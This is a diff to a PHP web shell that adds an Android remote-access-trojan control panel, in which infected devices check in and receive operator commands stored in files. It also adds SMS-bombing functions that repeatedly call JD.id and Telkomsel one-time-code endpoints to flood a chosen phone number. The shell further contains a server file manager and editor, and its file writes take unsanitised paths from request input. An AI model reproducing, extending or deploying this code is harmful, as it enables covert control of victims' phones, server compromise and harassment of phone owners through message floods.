@@ -2,24 +2,29 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
+
 if(isset($_GET['rat-android-siapa'])) {
-        $path = dirname(__FILE__)."/rat/android/target/";
+        $path = dirname(__FILE__)."/rat/android/";
+        $siapa = $_GET['rat-android-siapa'];
         if (!file_exists($path)) {
              mkdir($path, 0777, true);
         }
-        $siapa = $_GET['rat-android-siapa'];
-        $file = fopen($path.$siapa, "w");
-	fwrite($file, "");
-	fclose($file);
+        xwriteFile($path.$siapa, $siapa);
 
-        $data = [ "target" => $_SESSION['rat-android-target'],
-                  "aksi" => $_SESSION['rat-android-aksi']
+        $data = [ "target" => xreadFile($path."target.txt"),
+                  "aksi" => xreadFile($path."aksi.txt")
         ];
 
         echo json_encode($data);
 }
 elseif(isset($_GET['rat-android-target'])) {
-        $_SESSION['rat-android-target'] = $_GET['rat-android-target'];
+        $path = dirname(__FILE__)."/rat/android/";
+        $target = $_GET['rat-android-target'];
+        if (!file_exists($path)) {
+             mkdir($path, 0777, true);
+        }
+        xwriteFile($path."target.txt", $target);
+
         echo("<script>location.href = '?backdoor';</script>");
 }
 else {
@@ -536,7 +541,7 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                         echo "function mysave(id, content){  alert(content);  }";
                         echo "</script>";
 
-                        echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /><br><textarea id="textarea_1" name="src" cols="80" rows="15">'.    htmlspecialchars(file_get_contents($_POST["path"]))  .'</textarea></form>';
+                        echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /><br><textarea id="textarea_1" name="src" cols="800" rows="105">'.    htmlspecialchars(file_get_contents($_POST["path"]))  .'</textarea></form>';
                 }
 
                 elseif($_POST['opt'] == 'edit'){
@@ -1060,6 +1065,21 @@ function writeable($path, $perms) {
 	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
 }
 
+
+function xreadFile($src) {
+    $_data = fopen($src, "r") or die("Gagal membuka file!");
+    $data = fread($_data, filesize($src));
+    fclose($_data);
+
+    return $data;
+}
+
+function xwriteFile($src, $data) {
+    $_data = fopen($src, "w");
+    fwrite($_data, $data);
+    fclose($_data);
+}
+
 function curl($url, $post = false, $data = null) {
     $ch = curl_init($url);
     	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -1149,23 +1169,92 @@ function massdelete($dir, $filename) {
 	}
 }
 
+function jdid_smsbom($no, $jum, $wait){
+    $x = 0; 
+    while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $server_output = curl_exec ($ch);
+        curl_close ($ch);
+		echo $server_output."\n";
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+function telk_smsbom($no, $jum, $wait){
+    $x = 0; 
+    while($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL,"https://tdwidm.telkomsel.com/passwordless/start");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=%2B".$no."&connection=sms");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_REFERER, 'https://my.telkomsel.com/');
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $server_output = curl_exec ($ch);
+        curl_close ($ch);
+        echo $server_output."\n";
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+
 function backdoor($os, $args = null) 
 {   
         if($os == "android") {
+            $path = dirname(__FILE__)."/rat/android/";
+            if (!file_exists($path."target.txt") || !file_exists($path."aksi.txt")) {
+                  mkdir($path, 0777, true);
+                  xwriteFile($path."target.txt", "kosong");
+                  xwriteFile($path."aksi.txt", "kosong");
+            }
             echo "<font color='green'><h2>Android backdoor selected</h2></font>";
             echo '<form method="POST" action="?backdoor">
-                  <input type="submit" value="select target" name="rat-android-target"/>&nbsp&nbsp&nbsp'.$_SESSION['rat-android-target'].'<br><br>
-                  <input type="submit" value="List aksi" name="rat-android-aksiList"/>&nbsp&nbsp&nbsp'.$_SESSION['rat-android-aksi'].'<br>
+                  <input type="submit" value="select target" name="rat-android-target"/>&nbsp&nbsp&nbsp'.xreadFile($path."target.txt").'<br><br>
+                  <input type="submit" value="List aksi" name="rat-android-aksiList"/>&nbsp&nbsp&nbsp'.xreadFile($path."aksi.txt").'<br>
                   
                   <textarea cols=30 rows=2 name="rat-android-aksi" style="background:#ffffff;color:#000000"></textarea>
-                  <input type="submit" value="Save" name="rat-android-save"/><br>
-                  <input type="submit" value="Exploit" name="rat-android-exploit"/>
+                  <input type="submit" value="Exploit" name="rat-android-exploit"/><br>
+                  <input type="submit" value="Save" name="rat-android-save"/>
                   <input type="submit" value="Help" name="rat-android-help"/>
                   <input type="submit" value="Keluar OS" name="rat-android-keluar"/>
                   </form>';
             if (isset($_POST['rat-android-exploit'])) {
-                  $_SESSION['rat-android-aksi'] = $_POST['rat-android-aksi'];
+                  $aksi = $_POST['rat-android-aksi'];
+                  
+                  xwriteFile($path."aksi.txt", $aksi);
                   echo("<script>location.href='?backdoor';</script>");
+            }
+            elseif (isset($_POST['rat-android-aksiList'])) {
+                  echo "<font color='yellow'><h2>----- History list -----</h2></font>";
+                  echo "<form method='POST'><input type='submit' value='Reset' name='rat-android-history-reset'/></form><br>";
+                  $dir = getcwd()."/rat/android/history.txt";
+                  $_data = fopen($dir, "r") or die("Gagal membuka file!");
+                  $data = fread($_data, filesize($dir));
+                  fclose($_data);
+
+                  $out = explode("\n", $data);
+                  for ($i=0; $i<count($out); $i++) {
+                        echo "<h2>".$out[$i]."</h2>";
+                  }
+            }
+            elseif (isset($_POST['rat-android-save'])) {
+                  $path = dirname(__FILE__)."/rat/android/";
+                  
+                  $file = fopen($path."history.txt", "a");
+	          fwrite($file, $_POST['rat-android-aksi']."\n");
+	          fclose($file);
+                  echo "<script>alert('payload aksi disimpan tekan list untuk melihat');</script>";
             }
             elseif (isset($_POST['rat-android-save'])) {
             }
@@ -1178,7 +1267,7 @@ function backdoor($os, $args = null)
             }
             elseif(isset($_POST['rat-android-target'])) {
                    echo "<font color='yellow'><h2>Target menu android</h2></font>";
-                   $dir = getcwd()."/rat/android/target";
+                   $dir = getcwd()."/rat/android/";
                    if (is_dir($dir)) {
                          if ($dh = opendir($dir)) {
                              while($file = readdir($dh)) {
